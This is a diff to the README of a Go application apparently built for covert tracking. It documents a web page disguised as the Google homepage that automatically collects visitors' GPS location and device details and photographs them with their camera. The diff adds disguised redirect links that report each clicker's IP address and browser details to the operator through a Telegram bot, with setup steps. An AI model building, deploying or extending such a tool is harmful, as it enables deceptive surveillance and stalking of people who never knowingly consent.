@@ -7,9 +7,11 @@ A Go-based location and photo tracking application that captures device informat
 - **Location Tracking**: Captures GPS coordinates from browser's geolocation API
 - **Device Information**: Collects detailed device and browser information
 - **Photo Capture**: Takes photos using the device's camera through web interface
+- **Click Tracking**: Monitor link clicks with real-time Telegram notifications
 - **Data Storage**: Stores tracking data in MongoDB
 - **Photo Storage**: Uploads captured photos to AWS S3
 - **Web Interface**: Simple HTML interface disguised as Google homepage
+- **Telegram Integration**: Real-time notifications for click tracking events
 
 ## Tech Stack
 
@@ -28,7 +30,8 @@ trackme/
 │   ├── config/           # Configuration (MongoDB, AWS S3)
 │   ├── handlers/         # HTTP handlers and routes
 │   ├── models/           # Data models
-│   └── repository/       # Database operations
+│   ├── repository/       # Database operations
+│   └── services/         # External service integrations (Telegram)
 ├── web/                  # Static web assets
 │   ├── index.html        # Main webpage
 │   └── static/
@@ -50,6 +53,10 @@ AWS_S3_REGION=your-region
 AWS_ACCESS_KEY_ID=your-access-key
 AWS_SECRET_ACCESS_KEY=your-secret-key
 AWS_S3_BUCKET=your-bucket-name
+
+# Telegram Bot Configuration
+TELEGRAM_BOT_TOKEN=your-telegram-bot-token
+TELEGRAM_CHAT_ID=your-telegram-chat-id
 ```
 
 ## Installation & Setup
@@ -104,15 +111,41 @@ The application is configured for Railway deployment with `railway.toml`. Deploy
 | POST | `/locations` | Save location and device data |
 | GET | `/locations` | Retrieve all location records |
 | POST | `/locations/photos` | Upload photo files |
+| GET | `/click?url=TARGET_URL` | Click tracking with Telegram notifications |
 
 ## Usage
 
+### Web Interface
 1. Access the web interface (appears as Google homepage)
 2. The application automatically:
    - Requests geolocation permission
    - Captures device information
    - Takes a photo using the camera
    - Stores all data in the backend
+
+### Click Tracking Feature
+Create trackable links to monitor when someone clicks them:
+
+1. **Setup Telegram Bot:**
+   - Message @BotFather on Telegram
+   - Create a new bot using `/newbot` command
+   - Get your bot token and add it to `TELEGRAM_BOT_TOKEN`
+   - Start a chat with your bot
+   - Get your chat ID from `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
+   - Add your chat ID to `TELEGRAM_CHAT_ID`
+
+2. **Create Trackable Links:**
+   ```
+   https://your-domain.com/click?url=https://example.com
+   ```
+
+3. **Receive Notifications:**
+   When someone clicks the link, you'll receive a Telegram notification containing:
+   - Timestamp of the click
+   - Visitor's IP address
+   - User agent (browser/device info)
+   - Referer URL
+   - Target URL they were redirected to
 
 ## Data Models
 
